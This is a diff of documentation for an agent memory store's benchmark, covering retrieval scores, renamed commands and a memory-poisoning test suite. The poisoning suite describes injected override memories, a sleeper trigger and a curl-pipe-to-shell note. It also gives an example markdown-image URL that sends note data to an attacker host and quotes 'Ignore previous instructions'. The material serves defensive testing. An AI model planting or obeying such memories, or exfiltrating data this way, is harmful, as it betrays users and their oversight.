@@ -29,7 +29,7 @@ Five suites, written as plain JSON files in [`bench/scenarios/`](https://github.
 | **B  Contradiction recovery** | Writer A says X, writer B says not-X, a trusted correction arrives. Does the state end up at the correction, does the loser stay visible with its writer, does distrusting the bad writer fix the answer, can a weak writer overwrite a trusted note silently? | resolved to the correction, loser still visible with provenance, weak overwrite protected |
 | **C  Permission isolation** | Can tenant B read, write, search, export, import, merge, archive, sweep or learn anything about tenant A? Do tokens do exactly what their scope says? | `leakage-count` (must be 0) and `unexpected-denials` |
 | **D  Provenance retention** | After export, import, merge, update, archive, expiry: is every field (source, writer, creator, timestamps, deletion deadline, confidence) still there? | `fields-checked`, `fields-lost`, `fields-kept-only-as-unverified-claim` |
-| **E  Memory poisoning** | Do injected or malicious memories ever reach an agent as trusted content? Prompt-injection (plain, forged system/tool tags, zero-width-obfuscated, a booking-policy override) quarantined; a reworded override that passes the gate leaves all four booking answers once its writer is distrusted (E15/E16, adapted from the Agent Memory hygiene demo by elizabethfuentes12, MIT-0); a sleeper trigger or a curl-pipe-to-shell note is stored but comes back with a warning (E17/E18); a distrusted or low-trust writer cannot outrank or silently overwrite a trusted fact; secrets redacted on capture and blocked on write; a forged writer/namespace stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; the SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer. | `poison-reach-count` (must be 0) over the suite's defended probes |
+| **E  Memory poisoning** | Do injected or malicious memories ever reach an agent as trusted content? Prompt-injection (plain, forged system/tool tags, zero-width-obfuscated, a booking-policy override) held; a reworded override that passes the gate leaves all four booking answers once its writer is distrusted (E15/E16, adapted from the Agent Memory hygiene demo by elizabethfuentes12, MIT-0); a sleeper trigger or a curl-pipe-to-shell note is stored but comes back with a warning (E17/E18); a distrusted or low-trust writer cannot outrank or silently overwrite a trusted fact; secrets redacted on capture and blocked on write; a forged writer/namespace stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; the SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer. | `poison-reach-count` (must be 0) over the suite's defended probes |
 
 **How the numbers are counted.**
 
@@ -138,7 +138,7 @@ instance (default `main`), which is how a note is moved between two servers.
 | `supersede_preview` | `id`, `old` (refs), `new_note` (`{title, body, tags, confidence}`) or `new_ref` | Step 1 of a replacement. Must change nothing. Stores the one-time code under `id`. |
 | `supersede_confirm` | `id`, `from` (a preview step's id), `new_note`, `acknowledge_risk`, `ref`, `corrupt_code` | Step 2. Uses the code from `from` (the same new text unless `new_note` is given; `corrupt_code` damages the code). `ref` names the replacement note. Run it `as` another actor to test that a code works for nobody else. |
 | `supersede_undo` | `ref` | Bring a replaced note back. |
-| `confirm` | `ref` | A person confirms the note's current version (needs `confirm`; Monomem: an admin token's confirm, the dashboard's). A confirm that does not count is `invalid`. |
+| `confirm` | `ref` | A person confirms the note's current version (needs `confirm`; Monomem: an admin key's confirm, the dashboard's). A confirm that does not count is `invalid`. |
 | `history`, `restore_version` | `ref`, `id`; `version`, `if_rev_of` | A note's earlier versions; put one back as a new version. |
 | `list`, `recall`, `changes`, `sweep` | `id` | List notes, "what is relevant to this message" (`q`), the change feed, run the expiry sweep. |
 | `distrust`, `undistrust` | `writer`, `namespace` | Manage the distrust list. |
@@ -195,8 +195,8 @@ interface MemoryAdapter {
 ```
 
 "As writer" and "as namespace" are the *actor*: `WorldSpec.actors[name]` carries `{ scope, writer, namespace,
-server }`, and every call names the actor it is made as. Return `OpResult { outcome, note?, notes?, hits?, text?,
-data? }` where `outcome` is one of `ok`, `denied`, `not_found`, `conflict`, `invalid`, `quarantined`,
+server }`, and every call names the actor it is made as. Return
+`OpResult { outcome, note?, notes?, hits?, text?, data? }` where `outcome` is one of `ok`, `denied`, `not_found`, `conflict`, `invalid`, `quarantined`,
 `unsupported`, `error`, and notes use the benchmark's field names (`writer`, `creator`, `stale`, `taint`, ...;
 leave out the ones your system does not have).
 
@@ -251,9 +251,9 @@ monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [-
   `evidence` dialog ids; `--granularity session` writes one note per session and scores sessions.
 - **Questions.** LongMemEval's 30 abstention questions (`_abs`) have no gold session and are left out: 470 of
   500 are scored. LoCoMo questions with no usable evidence id are left out: 1,982 of 1,986.
-- **Three searches are scored.** `keyword` is `runSearch(mode: "keyword")`, the path behind `state_search` and
+- **Three searches are scored.** `keyword` is `runSearch(mode: "keyword")`, the path behind `memory_search` (formerly `state_search`) and
   `GET /search`: FTS5/BM25 with every word first, then (since OneMemory 2.0.0, before the rename) notes matching some of the words, always ranked
-  below full matches. `relevant` is `runRelevantSearch` (the `state_relevant` tool and `POST /relevant`): stop words
+  below full matches. `relevant` is `runRelevantSearch` (`memory_search` with `mode: "relevant"`, the 1.5 `state_relevant` tool, and `POST /relevant`): stop words
   dropped, any keyword qualifies, one BM25 OR query scaled by the share of keywords each note contains (before 2026-11-04:
   per-keyword BM25 rankings fused with RRF; the keyword fallback used the same). `--mode hybrid` also scores
   `runSearch(mode: "hybrid")` (BM25 + embeddings; since 2026-11-04 a 0.5 / 0.5 blend of min-max-scaled scores, before
@@ -525,8 +525,8 @@ through a local Ollama (`MONOMEM_EMBEDDINGS=on`, `MONOMEM_EMBED_URL=http://127.0
 Commands exactly as above. Wall time with embeddings: LongMemEval session 15 min (embedding every session is the cost),
 LoCoMo a few minutes; keyword-only runs take seconds.
 
-**Search ranking change, 2026-11-04.** The any-keyword step (the fallback behind `state_search`, and all of
-`state_relevant`) used to run one FTS query per keyword and fuse the lists with RRF, so a common word ("weekend")
+**Search ranking change, 2026-11-04.** The any-keyword step (the fallback behind keyword search, and all of
+the relevant mode) used to run one FTS query per keyword and fuse the lists with RRF, so a common word ("weekend")
 counted as much as a rare one ("giraffe"). It now runs one BM25 `OR` query, where rare words weigh more, and scales
 each score by the share of the question's keywords the note contains. Old and new code were run back to back on the
 same PC (Node v24.18.0) with the same commands:
@@ -550,7 +550,7 @@ Every quality number went up or stayed level except LoCoMo session R@10 (94.9 to
 Search times are the mean p50 of two interleaved runs of each version (old, new, old, new). Two speed changes ship
 with the ranking change: the keyword-coverage check is plain `indexOf` scans, and the FTS index gains FTS5's
 1-character prefix index (`prefix='1'`, about 8 % more index size; a store made without it is rebuilt once on open, and
-older builds read it unchanged). Keyword search is now faster on all three runs; `state_relevant` is faster on LoCoMo
+older builds read it unchanged). Keyword search is now faster on all three runs; the relevant mode is faster on LoCoMo
 and about 0.4 ms slower on LongMemEval's long sessions (it now reads its candidate notes for the coverage check). The
 old code scored LongMemEval-S keyword R@5 95.1 in one run and 94.9 in two others on the same day; ranking includes an
 age penalty measured against the current clock, so ties can move. Latency on this PC moves by a millisecond or more
@@ -613,20 +613,20 @@ splits questions, and LoCoMo's halves share the same 10 conversations. A stricte
 56.9 (keyword) by turn, and 90.8 vs 85.1 vs 89.0 by session. A dataset we have not looked at would be the real test; none
 has been run yet. Differences under about 1.5 points on LoCoMo turn R@5 are within noise.
 
-**`memory_index` and session neighbours, 2026-11-04.** `memory_index`, the search over captured observations, still used
+**Session index and session neighbours, 2026-11-04.** The session index (`memory_sessions` action `index`, the 1.5 `memory_index` tool), the search over captured observations, still used
 the all-words search, so a question found nothing. It now uses `keywordWithFallback` plus a session-neighbour boost: a
 captured row gains half the score of a hit written just before or after it in the same capture session
 (`SESSION_NEIGHBOUR_WEIGHT`, swept 0.1 to 1.0 offline; chosen on LoCoMo conversations 1-5). Measured through
 `memoryIndex()` itself, with every LoCoMo-10 turn stored as a captured observation in its session:
 
-| memory_index, LoCoMo-10 turns | conversations 1-5 R@5 / R@10 / nDCG@10 | conversations 6-10 (not used to choose) | p50 |
+| session index, LoCoMo-10 turns | conversations 1-5 R@5 / R@10 / nDCG@10 | conversations 6-10 (not used to choose) | p50 |
 |---|---|---|---|
 | before (all words) | 0.0 / 0.0 / 0.0 | 0.2 / 0.2 / 0.1 | 0.2 ms |
 | + any-keyword search | 59.7 / 66.3 / 48.7 | 56.9 / 65.2 / 47.0 | 1.0 ms |
 | + session neighbours | **65.1 / 70.8 / 51.2** | **61.7 / 68.4 / 49.6** | 1.6 ms |
 
 Offline, the same neighbour boost on top of hybrid gave 70.3 R@5 on conversations 6-10 (hybrid alone 65.3). It only applies
-to captured rows (observations, summaries): ordinary notes have no session, so `state_search` results are unchanged.
+to captured rows (observations, summaries): ordinary notes have no session, so keyword search results are unchanged.
 Caveat: LoCoMo turns are a chat between two people; captured coding-session rows may benefit less or more, unmeasured.
 
 **Measured and not shipped: nomic-embed-text task prefixes** (`search_query:` / `search_document:`). Offline, same vectors:
@@ -652,11 +652,11 @@ Per question type, LongMemEval-S, `relevant`, now:
 
 | Search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
 |---|---|---|---|---|---|---|
-| keyword (`state_search`) | 95.1 | 97.2 | 88.3 | 87.0 | 87.9 | 2.7 / 5.3 ms |
-| relevant (`state_relevant`) | 95.3 | 97.4 | 88.5 | 87.1 | 88.0 | 1.4 / 3.0 ms |
+| keyword (`memory_search`) | 95.1 | 97.2 | 88.3 | 87.0 | 87.9 | 2.7 / 5.3 ms |
+| relevant (`memory_search` mode "relevant") | 95.3 | 97.4 | 88.5 | 87.1 | 88.0 | 1.4 / 3.0 ms |
 | hybrid (BM25 + embeddings) | **96.8** | **98.5** | **93.0** | **90.4** | **91.4** | 21 / 30 ms |
 
-Before the OneMemory 2.0.0 fallback, `state_search` needed every word of the question and scored R@5 11.9 here.
+Before the OneMemory 2.0.0 fallback, keyword search needed every word of the question and scored R@5 11.9 here.
 
 Per question type, `relevant`:
 
@@ -677,7 +677,7 @@ nDCG@10 87.5, MRR 88.6, search p50 1.7 ms.
 
 | Granularity / search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 |
 |---|---|---|---|---|---|---|
-| session, keyword (`state_search`) | 89.1 | 95.0 | 86.4 | 77.3 | 75.0 | 1.3 ms |
+| session, keyword (`memory_search`) | 89.1 | 95.0 | 86.4 | 77.3 | 75.0 | 1.3 ms |
 | session, relevant | 89.1 | 95.0 | 86.5 | 77.2 | 74.9 | 1.0 ms |
 | session, hybrid | 80.0 | 93.0 | 85.2 | 64.0 | 58.1 | 13 ms |
 | turn (dialog id), keyword | 44.8 | 52.3 | 46.0 | 38.1 | 37.2 | 2.1 ms |
@@ -686,7 +686,7 @@ nDCG@10 87.5, MRR 88.6, search p50 1.7 ms.
 
 ### How to read these numbers
 
-- **Natural-language questions to `state_search` used to fail.** Before OneMemory 2.0.0 it needed every word ("what", "did",
+- **Natural-language questions to keyword search used to fail.** Before OneMemory 2.0.0 it needed every word ("what", "did",
   "I", ...) in one note and found the right session 12 % of the time on LongMemEval-S. The any-word fallback fixed it
   (95 %); full matches still rank first, so short exact queries behave as before.
 - **Hybrid (2026-10-31 rows) was not always better.** On LoCoMo whole sessions the old RRF hybrid ranked worse than
@@ -733,11 +733,11 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
 | `GAP-SUPERSEDE` | No "this replaces that" link: write a second note and leave the first, and search returned both, the old one often first. | **Fixed in 1.6.0**: two-step replace; the old note is kept, hidden, labelled, undoable. | A05, A06, A10, A20, B03 (now pass) |
-| `GAP-RECENCY` | A 200-day-old note with better keyword overlap could outrank the current one (flagged, but not second). | **Fixed in 1.6.0**: a stale twin stays behind its newer twin. | A11 (now passes) |
+| `GAP-RECENCY` | A 200-day-old note with better keyword overlap could outrank the current one (flagged, but not second). | **Fixed in 1.6.0**: an older duplicate that is stale stays behind its newer one. | A11 (now passes) |
 | `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from Monomem. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
-| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in OneMemory 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in OneMemory 2.0.0**: a remote markdown image with a query string is held for review; README badge hosts are exempt. | E11 (now passes) |
 | `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
@@ -774,7 +774,7 @@ Every refused and held note was read by hand (`--show-held` prints them):
   pasted into a chatbot), 2 contain leftover Llama chat-template tokens (`<|start_header_id|>assistant`) in the dataset,
   1 is a broken flag emoji that left invisible Unicode tag characters behind, and 1 asks for a markdown image whose URL
   carries data. All 21 contain exactly what the rule is for; none is an accidental match. In a memory store they would still
-  be held, and approving one is `monomem quarantine`.
+  be held, and approving one is `monomem review held`.
 - **Held, docs (5):** all 5 quote attacks on purpose (changelog lines describing the check itself, and a migration guide
   that names "Ignore previous instructions" as an example). No accidental match.
 - **Refused, LongMemEval (27):** the real noise. Almost all are code or config examples with a sample password in them
@@ -790,12 +790,12 @@ Not measured: notes written by real agents over months, and non-English text. Th
 `bench/` in view, so a clean result on these corpora says the check is quiet on ordinary chat and docs, not that it is quiet
 on your notes. Run the script on an export of your own store to see your number.
 
-## `monomem drill`: the poisoning attacks on your own setup
+## `monomem check --attacks`: the poisoning attacks on your own setup
 
-`monomem drill` copies your store to a temporary folder (`VACUUM INTO`, your file is opened read-only), replays the
+`monomem check --attacks` (formerly `monomem drill`) copies your store to a temporary folder (`VACUUM INTO`, your file is opened read-only), replays the
 suite-E poisoning scenarios plus one self-poisoning case against the copy through the same adapter `monomem bench`
 uses, and deletes the copy. Unlike `bench`, it keeps your environment (`MONOMEM_LINT` and the rest), so the result
-reflects your configuration, except embeddings: the drill forces them off and never makes a network call. Each attack is `held`, `warned` (stored, but labelled or warned about) or `REACHED`.
+reflects your configuration, except embeddings: the replay forces them off and never makes a network call. Each attack is `held`, `warned` (stored, but labelled or warned about) or `REACHED`.
 `--json` prints the full result. Exit code 0 when only known misses got through, 1 otherwise, 2 when it could not run.
 
 Two attacks are known misses by design: E16 (a reworded override that no pattern matches; one admin distrust of the
@@ -804,11 +804,11 @@ Both are expected to reach the agent and are reported as such, not as passes.
 
 The same attacks, with their expected outcomes, are exported to `evals/poisoning-corpus.json` (see `evals/README.md`).
 
-## `monomem health`: one grade over the checks you already have
+## `monomem check`: one grade over the checks you already have
 
-`monomem health [--json] [--card [file.svg]]` prints one line per check, then a grade from A to F: Node and SQLite, the database,
-the SessionStart hook, the settings `doctor` warns about, `drill`, the audit chain, held writes, distrusted writers, notes carrying a
-`[REDACTED:...]` marker, and the memory size and token savings from `monomem meter`. Your store is only read; `drill` runs on a copy.
+`monomem check [--json] [--card [file.svg]]` (formerly `monomem health`) prints one line per check, then a grade from A to F: Node and SQLite, the database,
+the SessionStart hook, the settings `check --setup` warns about, `check --attacks`, the audit chain, held writes, distrusted writers, notes carrying a
+`[REDACTED:...]` marker, and the memory size and token savings from `monomem check --usage`. Your store is only read; the attack replay runs on a copy.
 
 Grade rule: start at A. Each warn lowers it one step (A to F). Any fail caps it at D. Unexpected drill reach (an attack other than
 the two known misses got through) is F. A to C exits 0, D to F exits 1. Fails are: Node or FTS5 unusable, no openable database, a broken
